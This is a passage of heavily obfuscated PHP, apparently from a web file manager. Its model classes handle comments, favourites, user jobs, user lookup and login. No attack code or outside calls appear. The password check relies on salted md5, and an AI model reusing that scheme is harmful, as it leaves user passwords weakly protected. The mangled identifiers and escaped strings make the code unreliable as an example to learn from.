$ˆ§áÎ× = $this->where($ï«‰¹»Ó)->find(); $…÷Éºé = _get($ˆ§áÎ×, $ï™¬²‹[1897], 0); $²ºÅ‹Ï§ = array($ï™¬²‹[255] => $…÷Éºé, $ï™¬²‹[1901] => array()); if (!$…÷Éºé) { return $²ºÅ‹Ï§; } $—„ËÌ² = Model($ï™¬²‹[1903])->field($ï™¬²‹[1676])->where($ï«‰¹»Ó)->limit(500)->select(); $—„ËÌ² = array_to_keyvalue($—„ËÌ², $ï™¬²‹[12], $ï™¬²‹[1676]); $²ºÅ‹Ï§[$ï™¬²‹[1901]] = Model($ï™¬²‹[513])->userListInfo($—„ËÌ²); return $²ºÅ‹Ï§; } public function remove($ƒ™ü¿÷) { $¦Ìœ‰„ =& $_SERVER[Ã¶¡¶„æ]; $éúÛ˜Ğ” = array($¦Ìœ‰„[1895] => $ƒ™ü¿÷); $ü˜ÙÓ¥š = $this->where($éúÛ˜Ğ”)->find(); if ($ü˜ÙÓ¥š[$¦Ìœ‰„[1894]]) { $this->where(array($¦Ìœ‰„[1895] => $ü˜ÙÓ¥š[$¦Ìœ‰„[1894]]))->setAdd($¦Ìœ‰„[1896], -1); } return $this->where($éúÛ˜Ğ”)->delete(); } public function edit($ŸŒƒ·§, $æ‚ÖÛÇÌ) { $§º®ü =& $_SERVER[Ã¶¡¶„æ]; $Û£Ş¯Œ´ = array($§º®ü[1895] => $ŸŒƒ·§); return $this->where($Û£Ş¯Œ´)->save(array($§º®ü[1904] => $æ‚ÖÛÇÌ)); } public function prasise($³ï³ Õ) { $ëàŠ¼Å– =& $_SERVER[Ã¶¡¶„æ]; $çÓø»ÍÊ = Model($ëàŠ¼Å–[1905]); $‡şÑùÈš = array($ëàŠ¼Å–[1895] => $³ï³ Õ, $ëàŠ¼Å–[1667] => USER_ID); $ºİì¸Ôï = $çÓø»ÍÊ->where($‡şÑùÈš)->find(); if (!$ºİì¸Ôï) { $çÓø»ÍÊ->add($‡şÑùÈš); $êÅæş’ = $this->where(array($ëàŠ¼Å–[1895] => $³ï³ Õ))->setAdd($ëàŠ¼Å–[1897], 1); } else { $çÓø»ÍÊ->where($‡şÑùÈš)->delete(); $êÅæş’ = $this->where(array($ëàŠ¼Å–[1895] => $³ï³ Õ))->setAdd($ëàŠ¼Å–[1897], -1); } return $êÅæş’; } public function targetInfo($Ÿ«¾¢¯é, $ĞÓÃì°µ) { $ãÆĞ‡Æ§ =& $_SERVER[Ã¶¡¶„æ]; $º€†Å¡„ = array($ãÆĞ‡Æ§[586] => $Ÿ«¾¢¯é, $ãÆĞ‡Æ§[587] => $ĞÓÃì°µ); $¨€£ Ğ = $this->where($º€†Å¡„)->count(); $››¯îŒŞ = "\x52\111\107\110\x54\40\112\117\x49\x4e\x20{$this->tablePrefix}\143\157\155\155\x65\x6e\x74\137\160\x72\x61\151\x73\145\x20\163\x74\x61\162\x20\x6f\156\x20\x63\x6f\x6d\155\145\156\164\56\143\x6f\x6d\155\x65\156\x74\x49\104\x20\x3d\40\x73\x74\x61\x72\x2e\x63\157\x6d\155\145\156\164\x49\104"; $è…ÆÔ°Ë = $this->alias($ãÆĞ‡Æ§[354])->where($º€†Å¡„)->join($››¯îŒŞ, $ãÆĞ‡Æ§[1906])->count(); $Š¹‹êÉ§ = array($ãÆĞ‡Æ§[1907] => $¨€£ Ğ, $ãÆĞ‡Æ§[1908] => $è…ÆÔ°Ë); return $Š¹‹êÉ§; } public function listData($ƒ×Ù·±Ö) { $Õ­‘®ß =& $_SERVER[Ã¶¡¶„æ]; if (isset($ƒ×Ù·±Ö[$Õ­‘®ß[1909]])) { if ($ƒ×Ù·±Ö[$Õ­‘®ß[1909]]) { $ƒ×Ù·±Ö[$Õ­‘®ß[1902]] = array($Õ­‘®ß[1028], intval($ƒ×Ù·±Ö[$Õ­‘®ß[1909]])); } unset($ƒ×Ù·±Ö[$Õ­‘®ß[1909]]); } if (isset($ƒ×Ù·±Ö[$Õ­‘®ß[1910]])) { if ($ƒ×Ù·±Ö[$Õ­‘®ß[1910]]) { $ƒ×Ù·±Ö[$Õ­‘®ß[1902]] = array($Õ­‘®ß[1025], intval($ƒ×Ù·±Ö[$Õ­‘®ß[1910]])); } unset($ƒ×Ù·±Ö[$Õ­‘®ß[1910]]); } return $this->_listData($ƒ×Ù·±Ö); } private function _listData($şº¡é½) { $Üõˆ¼Š¬ =& $_SERVER[Ã¶¡¶„æ]; $çà‰ƒªÀ = $this->where($şº¡é½)->_makeOrder()->selectPage(100); $this->_listAppendParent($çà‰ƒªÀ[$Üõˆ¼Š¬[369]]); $this->_listAppendUser($çà‰ƒªÀ[$Üõˆ¼Š¬[369]]); $this->_listAppendMeta($çà‰ƒªÀ[$Üõˆ¼Š¬[369]]); return $çà‰ƒªÀ; } private function _makeOrder() { $›ô¸Š©Ã =& $_SERVER[Ã¶¡¶„æ]; $´›£üñ = array($›ô¸Š©Ã[1897], $›ô¸Š©Ã[1896], $›ô¸Š©Ã[200]); $ÉÖº­ĞÁ = Input::get($›ô¸Š©Ã[457], $›ô¸Š©Ã[7], $›ô¸Š©Ã[423], $´›£üñ); $Ö©à— = Input::get($›ô¸Š©Ã[458], $›ô¸Š©Ã[7], $›ô¸Š©Ã[1669], array($›ô¸Š©Ã[1911], $›ô¸Š©Ã[453])); $ôë­Ãçô = $ÉÖº­ĞÁ . $›ô¸Š©Ã[53] . $Ö©à—; return $this->order($ôë­Ãçô); } private function _listAppendParent(&$ÕÏ·—’¢) { $¥™¦¯ =& $_SERVER[Ã¶¡¶„æ]; $üÅş«™ = array_unique(array_to_keyvalue($ÕÏ·—’¢, $¥™¦¯[12], $¥™¦¯[1894])); $üÅş«™ = array_remove_value($üÅş«™, $¥™¦¯[197]); if (!$üÅş«™) { return; } $é×÷Ìç€ = $this->where(array($¥™¦¯[1895] => array($¥™¦¯[7], $üÅş«™)))->select(); $é×÷Ìç€ = array_to_keyvalue($é×÷Ìç€, $¥™¦¯[1902]); foreach ($ÕÏ·—’¢ as &$Ôéâ­¦ã) { if (isset($é×÷Ìç€[$Ôéâ­¦ã[$¥™¦¯[1894]]])) { $Ôéâ­¦ã[$¥™¦¯[1912]] = $é×÷Ìç€[$Ôéâ­¦ã[$¥™¦¯[1894]]]; } } unset($Ôéâ­¦ã); } private function _listAppendUser(&$¢”˜Ã÷) { $Óº©³ı =& $_SERVER[Ã¶¡¶„æ]; $Å–™Øåº = array_unique(array_to_keyvalue($¢”˜Ã÷, $Óº©³ı[12], $Óº©³ı[1676])); $Å–™Øåº = array_remove_value($Å–™Øåº, $Óº©³ı[197]); if (count($Å–™Øåº) == 0) { return; } foreach ($¢”˜Ã÷ as $’õ£óù) { if (isset($’õ£óù[$Óº©³ı[1912]])) { $Å–™Øåº[] = $’õ£óù[$Óº©³ı[1912]][$Óº©³ı[1676]]; } } $½®ä’üù = Model($Óº©³ı[535])->userListInfo($Å–™Øåº); foreach ($¢”˜Ã÷ as &$’õ£óù) { $’õ£óù[$Óº©³ı[600]] = $½®ä’üù[$’õ£óù[$Óº©³ı[1676]]]; if (isset($’õ£óù[$Óº©³ı[1912]])) { $’õ£óù[$Óº©³ı[1912]][$Óº©³ı[600]] = $½®ä’üù[$’õ£óù[$Óº©³ı[1912]][$Óº©³ı[1676]]]; } } unset($’õ£óù); } private function _listAppendMeta(&$‚™ş”£”) { $ù§ö¾ø =& $_SERVER[Ã¶¡¶„æ]; $şÇÄ‹× = array_unique(array_to_keyvalue($‚™ş”£”, $ù§ö¾ø[12], $ù§ö¾ø[1902])); $şÇÄ‹× = array_remove_value($şÇÄ‹×, $ù§ö¾ø[197]); if (!$şÇÄ‹×) { return; } foreach ($‚™ş”£” as $İ£â ğ) { if (isset($İ£â ğ[$ù§ö¾ø[1912]])) { $şÇÄ‹×[] = $İ£â ğ[$ù§ö¾ø[1912]][$ù§ö¾ø[1902]]; } } $Ã ˜„© = $this->metaList($şÇÄ‹×); if (!$Ã ˜„©) { return !1; } foreach ($‚™ş”£” as &$İ£â ğ) { $İ£â ğ[$ù§ö¾ø[466]] = $Ã ˜„©[$İ£â ğ[$ù§ö¾ø[1902]]]; if (isset($İ£â ğ[$ù§ö¾ø[1912]])) { $İ£â ğ[$ù§ö¾ø[1912]][$ù§ö¾ø[466]] = $Ã ˜„©[$İ£â ğ[$ù§ö¾ø[1912]][$ù§ö¾ø[1902]]]; } } unset($İ£â ğ); } private function metaList($ƒìÕªÍ) { $ËöƒŒœ‰ =& $_SERVER[Ã¶¡¶„æ]; if (!$ƒìÕªÍ) { return array(); } $ßí˜÷îª = array($ËöƒŒœ‰[1902] => array($ËöƒŒœ‰[7], $ƒìÕªÍ)); $õ¶ŸŒìì = Model($ËöƒŒœ‰[1913])->where($ßí˜÷îª)->select(); $õ¶ŸŒìì = array_to_keyvalue_group($õ¶ŸŒìì, $ËöƒŒœ‰[1902]); foreach ($õ¶ŸŒìì as $Œ…‘­„è => $İ–÷ÎÁë) { $ÆşĞœ = array(); foreach ($İ–÷ÎÁë as $Ñş¢ºè¨) { $ÆşĞœ[$Ñş¢ºè¨[$ËöƒŒœ‰[94]]] = $Ñş¢ºè¨[$ËöƒŒœ‰[374]]; } $õ¶ŸŒìì[$Œ…‘­„è] = $ÆşĞœ; } return $õ¶ŸŒìì ? $õ¶ŸŒìì : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\x69\154\145\137\x63\x6f\x6e\x74\x65\156\164\x73"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\124\151\x6d\145", "\164\x69\155\145", "\151\x6e\163\x65\162\164", "\146\x75\x6e\143\x74\151\x6f\x6e")); } goto C°‰ˆ²êÚÕ; fåÙ‰ —ÕÜ: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($ä×±´—) { $çÕ¯ÃØÍ =& $_SERVER[Ã¶¡¶„æ]; return array($çÕ¯ÃØÍ[1976] => array(USER_ID, $çÕ¯ÃØÍ[2305])); } protected function listData() { $¶¸æ¥šø =& $_SERVER[Ã¶¡¶„æ]; $¿¢§øŸ = array($¶¸æ¥šø[1667] => USER_ID, $¶¸æ¥šø[484] => 0); $Ì¢²úÑ¼ = $¶¸æ¥šø[2306]; $²œãşÎ² = $this->field($Ì¢²úÑ¼)->where($¿¢§øŸ)->order($¶¸æ¥šø[2307])->select(); return $²œãşÎ² ? $²œãşÎ² : array(); } protected function resetCache() { } protected function listView() { $ø²ß®Ô˜ =& $_SERVER[Ã¶¡¶„æ]; $ú¡ä¿„Ê = $this->listData(); $†ºÓê¦¤ = array_filter_by_field($ú¡ä¿„Ê, $ø²ß®Ô˜[33], $ø²ß®Ô˜[416]); $Ç ªî§¸ = array_to_keyvalue($†ºÓê¦¤, $ø²ß®Ô˜[12], $ø²ß®Ô˜[84]); if (!$Ç ªî§¸) { return $ú¡ä¿„Ê; } $¢İàîñÏ = 2000; $Í·¢´Á¹ = array($ø²ß®Ô˜[417] => array($ø²ß®Ô˜[418], $Ç ªî§¸)); $¸‚‹Ë»è = Model($ø²ß®Ô˜[831])->listSource($Í·¢´Á¹, $¢İàîñÏ); $¸‚‹Ë»è = array_merge($¸‚‹Ë»è[$ø²ß®Ô˜[83]], $¸‚‹Ë»è[$ø²ß®Ô˜[82]]); $¸‚‹Ë»è = array_to_keyvalue($¸‚‹Ë»è, $ø²ß®Ô˜[402]); foreach ($ú¡ä¿„Ê as $úÓ–˜£• => $«Ğšóí) { $¯·§Ø°  = $¸‚‹Ë»è[$«Ğšóí[$ø²ß®Ô˜[84]]]; $¯·§Ø°  = $¯·§Ø°  ? $¯·§Ø°  : array(); $ú¡ä¿„Ê[$úÓ–˜£•] = array_merge($¯·§Ø° , $«Ğšóí); } return $ú¡ä¿„Ê; } protected function addFav($°Üá”Î, $‹§ÓœóÛ = '', $˜…ïÁêş = "\163\157\165\x72\x63\x65") { $ÓÚ¦¦” =& $_SERVER[Ã¶¡¶„æ]; $Ö—æ¨Ïò = array($ÓÚ¦¦”[1667] => USER_ID, $ÓÚ¦¦”[484] => 0, $ÓÚ¦¦”[422] => $˜…ïÁêş, $ÓÚ¦¦”[421] => $°Üá”Î); if ($this->where($Ö—æ¨Ïò)->find()) { return !1; } $Ö—æ¨Ïò = array($ÓÚ¦¦”[1667] => USER_ID, $ÓÚ¦¦”[484] => 0); $Úê‰ú Ñ = $this->where($Ö—æ¨Ïò)->max($ÓÚ¦¦”[1889]); if (!$Úê‰ú Ñ) { $Úê‰ú Ñ = 0; } if (!$‹§ÓœóÛ && $˜…ïÁêş == $ÓÚ¦¦”[416]) { $ÔÔ€Ã = Model($ÓÚ¦¦”[1350])->where(array($ÓÚ¦¦”[417] => $°Üá”Î))->find(); if (!$ÔÔ€Ã) { return !1; } $‹§ÓœóÛ = $ÔÔ€Ã[$ÓÚ¦¦”[32]]; } $‹§ÓœóÛ = $this->getAutoName($‹§ÓœóÛ); $™¶ğ‰¿ = array($ÓÚ¦¦”[1667] => USER_ID, $ÓÚ¦¦”[484] => 0, $ÓÚ¦¦”[420] => $‹§ÓœóÛ, $ÓÚ¦¦”[421] => $°Üá”Î, $ÓÚ¦¦”[422] => $˜…ïÁêş, $ÓÚ¦¦”[1869] => $Úê‰ú Ñ + 1); return $this->add($™¶ğ‰¿); } protected function remove($ˆ¥ÊÚ®¹) { $‰‹ã•Ê˜ =& $_SERVER[Ã¶¡¶„æ]; $É‹ñ¨È = array($‰‹ã•Ê˜[1667] => USER_ID, $‰‹ã•Ê˜[419] => $ˆ¥ÊÚ®¹); return $this->where($É‹ñ¨È)->delete(); } protected function removeByName($ü•˜­şğ) { $Ú¾£ô‰¶ =& $_SERVER[Ã¶¡¶„æ]; $›­äÕÜà = array($Ú¾£ô‰¶[1667] => USER_ID, $Ú¾£ô‰¶[420] => $ü•˜­şğ, $Ú¾£ô‰¶[484] => 0); return $this->where($›­äÕÜà)->delete(); } protected function rename($ü›•ÍÛ£, $¿¯»Ÿàè) { $½Â©¤ı =& $_SERVER[Ã¶¡¶„æ]; if ($ü›•ÍÛ£ == $¿¯»Ÿàè) { return !1; } $êÇ¾Ñõ¦ = $this->getAutoName($¿¯»Ÿàè); if ($¿¯»Ÿàè != $êÇ¾Ñõ¦) { return !1; } $±Ïó„½ = array($½Â©¤ı[1667] => USER_ID, $½Â©¤ı[484] => 0, $½Â©¤ı[32] => $ü›•ÍÛ£); return $this->where($±Ïó„½)->save(array($½Â©¤ı[32] => $¿¯»Ÿàè)); } protected function resetSort($Œ÷ßŒñ) { $ö§ì»şß =& $_SERVER[Ã¶¡¶„æ]; $Œ÷ßŒñ = is_array($Œ÷ßŒñ) ? $Œ÷ßŒñ : array(); $Ì¡ù±¯œ = array($ö§ì»şß[1667] => USER_ID); for ($¢ú–ù¿ = 0; $¢ú–ù¿ < count($Œ÷ßŒñ); $¢ú–ù¿++) { $Ì¡ù±¯œ[$ö§ì»şß[419]] = $Œ÷ßŒñ[$¢ú–ù¿]; $this->where($Ì¡ù±¯œ)->save(array($ö§ì»şß[1869] => $¢ú–ù¿ + 1)); } return !0; } protected function moveTop($Êúøè»ê) { $úÈÍÆ‰± =& $_SERVER[Ã¶¡¶„æ]; $­ûİ®¦ = array($úÈÍÆ‰±[1667] => USER_ID, $úÈÍÆ‰±[484] => 0); $±êõ‘¶° = $this->where($­ûİ®¦)->where(array($úÈÍÆ‰±[32] => $Êúøè»ê))->find(); if (!$±êõ‘¶°) { return; } $Ã÷ˆÆæí = $this->field($úÈÍÆ‰±[399])->where($­ûİ®¦)->order($úÈÍÆ‰±[2307])->select(); $Ã÷ˆÆæí = array_to_keyvalue($Ã÷ˆÆæí, $úÈÍÆ‰±[12], $úÈÍÆ‰±[399]); $Øñ¤˜ö± = $Ã÷ˆÆæí; $Ã÷ˆÆæí = array_remove_value($Ã÷ˆÆæí, $±êõ‘¶°[$úÈÍÆ‰±[399]]); array_unshift($Ã÷ˆÆæí, $±êõ‘¶°[$úÈÍÆ‰±[399]]); return $this->resetSort($Ã÷ˆÆæí); } protected function moveBottom($ğÍ”µÃ) { $Äåäíƒ² =& $_SERVER[Ã¶¡¶„æ]; $Ï†ıÁÍÍ = array($Äåäíƒ²[1667] => USER_ID, $Äåäíƒ²[484] => 0); $ ·îí§ = $this->where($Ï†ıÁÍÍ)->max($Äåäíƒ²[1889]); $İƒä™ = array($Äåäíƒ²[1889] => $ ·îí§ + 1); return $this->where($Ï†ıÁÍÍ)->where(array($Äåäíƒ²[32] => $ğÍ”µÃ))->save($İƒä™); } private function getAutoName($¤Éô„°š) { $£÷Õ¶™© =& $_SERVER[Ã¶¡¶„æ]; $É¡Úøİ = array($£÷Õ¶™©[1667] => USER_ID, $£÷Õ¶™©[484] => 0); $¦ê±¨å’ = $this->field($£÷Õ¶™©[32])->where($É¡Úøİ)->select(); $¦ê±¨å’ = array_to_keyvalue($¦ê±¨å’, $£÷Õ¶™©[12], $£÷Õ¶™©[32]); if (!$¦ê±¨å’ || !in_array($¤Éô„°š, $¦ê±¨å’)) { return $¤Éô„°š; } for ($Ş§¸ÒòŒ = 0; $Ş§¸ÒòŒ < count($¦ê±¨å’); $Ş§¸ÒòŒ++) { if (!in_array($¤Éô„°š . "\50{$Ş§¸ÒòŒ}\51", $¦ê±¨å’)) { return $¤Éô„°š . "\50{$Ş§¸ÒòŒ}\x29"; } } return $¤Éô„°š . "\50{$Ş§¸ÒòŒ}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\x2e\152\x6f\142\x4c\x69\163\x74"; public $field = array("\x6e\141\155\145", "\144\x65\x73\x63", "\x73\x6f\162\164"); const JOB_KEY = "\x73\x65\154\x66\112\x6f\x62\x4c\x69\x73\164"; public function listData($¥É•®ú = false, $í¶‹˜è‚ = "\163\x6f\162\x74", $«ùèı¡ = false) { return parent::listData($¥É•®ú, $í¶‹˜è‚, $«ùèı¡); } public function remove($Ê¡âİÇ) { return parent::remove($Ê¡âİÇ); } public function add($»½¯ÖçË) { $ìÀ®ÊƒØ =& $_SERVER[Ã¶¡¶„æ]; if ($this->findByName($»½¯ÖçË[$ìÀ®ÊƒØ[32]])) { return !1; } $»½¯ÖçË[$ìÀ®ÊƒØ[1889]] = $this->getSort(); return parent::insert($»½¯ÖçË); } private function getSort() { $øƒ¡ü‘À =& $_SERVER[Ã¶¡¶„æ]; $¤Üø¬çˆ = parent::listData(); $ûÔîáŠ‡ = array_to_keyvalue($¤Üø¬çˆ, $øƒ¡ü‘À[12], $øƒ¡ü‘À[1889]); return empty($ûÔîáŠ‡) ? 0 : max($ûÔîáŠ‡) + 1; } public function update($²ş¬Ü›, $ÖÒá•ÍÑ) { $™À×·Š¸ =& $_SERVER[Ã¶¡¶„æ]; $†À±‹’› = parent::listData($²ş¬Ü›); $“¹–ªµŸ = $this->findByName($ÖÒá•ÍÑ[$™À×·Š¸[32]]); if (!$†À±‹’› || $“¹–ªµŸ && $“¹–ªµŸ[$™À×·Š¸[399]] != $†À±‹’›[$™À×·Š¸[399]]) { return !1; } return parent::update($²ş¬Ü›, $ÖÒá•ÍÑ); } public function setUserJob($©µÅõ, $†Î ÀÂÒ) { $ğ˜ú¬Ö¤ =& $_SERVER[Ã¶¡¶„æ]; if (!is_array($†Î ÀÂÒ)) { $†Î ÀÂÒ = array($†Î ÀÂÒ); } $ÉÚ±¿­ = parent::listData(); $çÖ¤Ô¬µ = array_to_keyvalue($ÉÚ±¿­, $ğ˜ú¬Ö¤[32]); $…¶Ô·‡‹ = $ğ˜ú¬Ö¤[378]; foreach ($†Î ÀÂÒ as $¡ƒ†à«í) { if ($çÖ¤Ô¬µ[$¡ƒ†à«í]) { $…¶Ô·‡‹ .= $çÖ¤Ô¬µ[$¡ƒ†à«í][$ğ˜ú¬Ö¤[399]] . $ğ˜ú¬Ö¤[50]; } else { $öû ¨ğ¯ = $this->add($¡ƒ†à«í); $…¶Ô·‡‹ .= $öû ¨ğ¯ . $ğ˜ú¬Ö¤[50]; } } $…¶Ô·‡‹ = rtrim($…¶Ô·‡‹, $ğ˜ú¬Ö¤[50]); Model($ğ˜ú¬Ö¤[535])->metaSet($©µÅõ, self::JOB_KEY, $…¶Ô·‡‹); } public function getUserJob($Í¨É”ì) { $¼Ä¨åË† = Model($_SERVER[Ã¶¡¶„æ][535])->metaGet($Í¨É”ì); return $this->getUserJobInfo($¼Ä¨åË†[self::JOB_KEY]); } public function getUserJobInfo($Œ¥Õ„¢³) { $ùûş™ëµ =& $_SERVER[Ã¶¡¶„æ]; $§ˆ¥¶Îì = explode($ùûş™ëµ[50], $Œ¥Õ„¢³); $è™âüƒ = parent::listData(); $è™âüƒ = array_remove_key($è™âüƒ, $ùûş™ëµ[200]); $Œ¶¡†ö¶ = array(); foreach ($§ˆ¥¶Îì as $¯ªóÏ…) { if (isset($è™âüƒ[$¯ªóÏ…])) { $Œ¶¡†ö¶[] = $è™âüƒ[$¯ªóÏ…]; } } return $Œ¶¡†ö¶; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\x72"; protected $tableMeta = array("\164\x61\142\154\145\116\x61\x6d\145" => "\165\163\145\x72\x5f\155\x65\x74\x61", "\155\x65\x74\x61\106\151\145\154\x64" => "\165\163\145\x72\x49\x44"); protected $simpleField = "\165\x73\x65\162\x49\104\54\x6e\x69\143\153\x4e\x61\155\145\54\156\x61\x6d\x65\54\141\x76\x61\x74\x61\x72\x2c\x73\145\x78\x2c\163\x74\141\164\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Ìúª¼‘ ) { $Œ¨È×Û =& $_SERVER[Ã¶¡¶„æ]; $¾©õ¢Ï¤ = $Œ¨È×Û[2308]; return array($Œ¨È×Û[1943] => array($Ìúª¼‘ [0], $¾©õ¢Ï¤), $Œ¨È×Û[1945] => array($Ìúª¼‘ [0], $¾©õ¢Ï¤), $Œ¨È×Û[2309] => array($Ìúª¼‘ [0], $¾©õ¢Ï¤)); } protected function getInfo($ùÚïÖ‹, $™Ì—‰ÑÙ = false) { $äœÆ²¥ = $this->getInfoSimple($ùÚïÖ‹); if (!is_array($äœÆ²¥)) { return array(); } if ($™Ì—‰ÑÙ) { return $this->_getInfoApply($äœÆ²¥); } return $this->cacheFunctionGet($_SERVER[Ã¶¡¶„æ][1947], $ùÚïÖ‹); } protected function getInfoFull($öĞ ¶ÚÈ, $ˆ²ı§×Ó = false) { $êæ¶ÏÕ = $this->getInfoSimple($öĞ ¶ÚÈ); if (!is_array($êæ¶ÏÕ)) { return array(); } if ($ˆ²ı§×Ó) { return $this->_getInfoApply($êæ¶ÏÕ, !0); } return $this->cacheFunctionGet($_SERVER[Ã¶¡¶„æ][2310], $öĞ ¶ÚÈ); } private function _getInfoApply($ÊŸÕà¶, $½¯øøóˆ = false) { $…­ü¬ô =& $_SERVER[Ã¶¡¶„æ]; if (!$ÊŸÕà¶) { return $ÊŸÕà¶; } $™ß§¶î… = md5($…­ü¬ô[2311] . $ÊŸÕà¶[$…­ü¬ô[903]] . $…­ü¬ô[2312] . $ÊŸÕà¶[$…­ü¬ô[32]]); $ÊŸÕà¶ = $this->_listDataApplyItem($ÊŸÕà¶); $Ï²Ù‹­Ë = Model($…­ü¬ô[1350])->metaGet($ÊŸÕà¶[$…­ü¬ô[86]][$…­ü¬ô[402]]); $ÊŸÕà¶[$…­ü¬ô[2313]] = $™ß§¶î…; $ÊŸÕà¶[$…­ü¬ô[86]][$…­ü¬ô[2134]] = isset($Ï²Ù‹­Ë[$…­ü¬ô[2135]]) ? $Ï²Ù‹­Ë[$…­ü¬ô[2135]] : null; if ($½¯øøóˆ) { $ÊŸÕà¶[$…­ü¬ô[466]] = $this->metaGet($ÊŸÕà¶[$…­ü¬ô[1676]]); } return $ÊŸÕà¶; } protected function getInfoSimple($©‡ú¦ƒ, $¥ĞÄó¶‘ = false) { $™âçµ =& $_SERVER[Ã¶¡¶„æ]; if (!$©‡ú¦ƒ) { return array(); } if ($¥ĞÄó¶‘) { $‚ŞÔşô€ = $this->where(array($™âçµ[1676] => intval($©‡ú¦ƒ)))->find(); if (!is_array($‚ŞÔşô€)) { return array(); } $‚ŞÔşô€[$™âçµ[543]] = Action($™âçµ[2314])->parseUrl($‚ŞÔşô€[$™âçµ[543]]); return $‚ŞÔşô€; } return $this->cacheFunctionGet($™âçµ[1948], $©‡ú¦ƒ); } protected function getInfoSimpleOuter($×¼Íİ) { $íÊáß°š =& $_SERVER[Ã¶¡¶„æ]; if (!$×¼Íİ || $×¼Íİ == 0) { return array($íÊáß°š[1676] => $íÊáß°š[197], $íÊáß°š[32] => $íÊáß°š[162] . LNG($íÊáß°š[2315]) . $íÊáß°š[164], $íÊáß°š[543] => STATIC_PATH . $íÊáß°š[2316]); } $„Ñ³Áùê = $this->cacheFunctionGet($íÊáß°š[1948], $×¼Íİ); $ŸÄùãù = array_field_key($„Ñ³Áùê, explode($íÊáß°š[50], $this->simpleField)); if (!$ŸÄùãù) { return array($íÊáß°š[1676] => $íÊáß°š[1203], $íÊáß°š[32] => $íÊáß°š[162] . LNG($íÊáß°š[2317]) . $íÊáß°š[164], $íÊáß°š[543] => STATIC_PATH . $íÊáß°š[2318]); } $ŸÄùãù[$íÊáß°š[543]] = Action($íÊáß°š[2314])->parseUrl($ŸÄùãù[$íÊáß°š[543]]); return $ŸÄùãù; } protected function groupUser($ÁÏŸñÖÑ) { } public static function errorLang($ºÛªùÈã) { $µÕç¢“ô =& $_SERVER[Ã¶¡¶„æ]; $ùªëğ…î = array(self::ERROR_USER_NOT_EXISTS => $µÕç¢“ô[2319], self::ERROR_USER_PASSWORD_ERROR => $µÕç¢“ô[2320], self::ERROR_USER_EXIST_NAME => $µÕç¢“ô[2321], self::ERROR_USER_EXIST_PHONE => $µÕç¢“ô[2322], self::ERROR_USER_EXIST_EMAIL => $µÕç¢“ô[2323], self::ERROR_USER_LOGIN_LOCK => $µÕç¢“ô[2324], self::ERROR_IP_NOT_ALLOW => $µÕç¢“ô[2325], self::ERROR_USER_EXIST_NICKNAME => $µÕç¢“ô[2326]); return LNG($ùªëğ…î[$ºÛªùÈã]); } public function getInfoByMeta($´¦Í‰Ö†, $¦öšŒµö) { $êûÇùí =& $_SERVER[Ã¶¡¶„æ]; $»öœú— = Model($êûÇùí[2327])->where(array($êûÇùí[94] => $´¦Í‰Ö†, $êûÇùí[374] => $¦öšŒµö))->find(); if ($»öœú—) { return $this->getInfo($»öœú—[$êûÇùí[1676]]); } return !1; } public function userLoginCheck($¤³ƒÇ‡ù, $õÔü…õ) { $½çĞâå£ =& $_SERVER[Ã¶¡¶„æ]; $øîîú“Ò = $this->userLoginFind($¤³ƒÇ‡ù); if (!$øîîú“Ò) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($øîîú“Ò[$½çĞâå£[1676]], $õÔü…õ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($øîîú“Ò[$½çĞâå£[1676]]); } public function userLoginFind($÷í¦Û­) { $½¶‰°Ùì =& $_SERVER[Ã¶¡¶„æ]; $ˆ·÷¥è = array($½¶‰°Ùì[32] => $÷í¦Û­, $½¶‰°Ùì[542] => $÷í¦Û­, $½¶‰°Ùì[305] => $÷í¦Û­, $½¶‰°Ùì[2328] => $÷í¦Û­, $½¶‰°Ùì[1014] => $½¶‰°Ùì[1016]); if ($this->nickNameRpt()) { unset($ˆ·÷¥è[$½¶‰°Ùì[542]]); } return $this->where($ˆ·÷¥è)->find(); } public function clearCache($¨Ê³Ş“ƒ) { $Î”œ÷¦ =& $_SERVER[Ã¶¡¶„æ]; $this->cacheFunctionClear($Î”œ÷¦[1947], $¨Ê³Ş“ƒ); $this->cacheFunctionClear($Î”œ÷¦[1948], $¨Ê³Ş“ƒ); $this->cacheFunctionClear($Î”œ÷¦[2310], $¨Ê³Ş“ƒ); } public function userPasswordCheck($é”û±¡ß, $×¿ì‹¢Ì) { $†Îœäµ« =& $_SERVER[Ã¶¡¶„æ]; $Ş§˜˜‰» = $this->where(array($†Îœäµ«[1676] => intval($é”û±¡ß)))->find(); $ÖÊƒò‡± = $this->metaGet($é”û±¡ß); $à‘ã¸µ× = isset($ÖÊƒò‡±[$†Îœäµ«[2329]]) ? $ÖÊƒò‡±[$†Îœäµ«[2329]] : $†Îœäµ«[12]; if (md5($à‘ã¸µ× . trim($×¿ì‹¢Ì)) !== $Ş§˜˜‰»[$†Îœäµ«[903]]) { return !1; } return !0; } public function userAdd($»íîãßÇ) { $ø‚Ùú³œ =& $_SERVER[Ã¶¡¶„æ]; $ÕÌë•Ò™ = array($ø‚Ùú³œ[420] => $»íîãßÇ[$ø‚Ùú³œ[32]], $ø‚Ùú³œ[2330] => $»íîãßÇ[$ø‚Ùú³œ[1557]], $ø‚Ùú³œ[2331] => isset($»íîãßÇ[$ø‚Ùú³œ[305]]) ? $»íîãßÇ[$ø‚Ùú³œ[305]] : $ø‚Ùú³œ[12], $ø‚Ùú³œ[2332] => isset($»íîãßÇ[$ø‚Ùú³œ[2328]]) ? $»íîãßÇ[$ø‚Ùú³œ[2328]] : $ø‚Ùú³œ[12], $ø‚Ùú³œ[2333] => isset($»íîãßÇ[$ø‚Ùú³œ[542]]) ? $»íîãßÇ[$ø‚Ùú³œ[542]] : $»íîãßÇ[$ø‚Ùú³œ[32]], 